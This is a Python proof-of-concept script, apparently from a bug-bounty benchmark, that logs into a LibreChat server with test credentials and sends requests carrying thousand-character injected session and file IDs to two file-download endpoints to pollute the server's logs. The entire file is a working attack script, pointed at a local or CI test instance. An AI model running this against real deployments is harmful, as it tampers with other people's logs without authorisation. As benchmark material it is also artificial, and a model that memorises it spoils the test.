import requests
import sys
import json

# Match bounty_0's URL setup
IS_CI_RUN = sys.argv[1] if len(sys.argv) > 1 else False
if IS_CI_RUN:
    BASE_URL = "http://librechat:3080"
    HOST = "librechat:3080"
else:
    BASE_URL = "http://localhost:3080"
    HOST = "localhost:3080"

LOGIN_URL = BASE_URL + "/api/auth/login"

def login(username="email@email.com", password="test@123"):
    data = {
        "email": username,
        "password": password
    }
    print(f"Logging in to {LOGIN_URL}")
    res = requests.post(LOGIN_URL, json=data)
    print(res.text)
    res_json = json.loads(res.text)
    return res_json["token"]

def inject_logs(token):
    headers = {
        "Authorization": f"Bearer {token}",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/c/new",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Host": HOST
    }

    # Create injection strings
    session_id = "A" * 1000 + "SESSIONINJECT"
    file_id = "B" * 1000 + "FILEINJECT"

    try:
        # Try both vulnerable endpoints
        urls = [
            f"{BASE_URL}/api/files/code/download/{session_id}/{file_id}",
            f"{BASE_URL}/api/files/download/{session_id}/{file_id}"
        ]

        for url in urls:
            print(f"Sending request to {url}")
            res = requests.get(url, headers=headers)
            print(f"Response status: {res.status_code}")
            print(res.text)
        return True
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

if __name__ == "__main__":
    try:
        token = login()
        if not inject_logs(token):
            print("Log injection failed")
            sys.exit(1)
        print("Log injection completed")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)
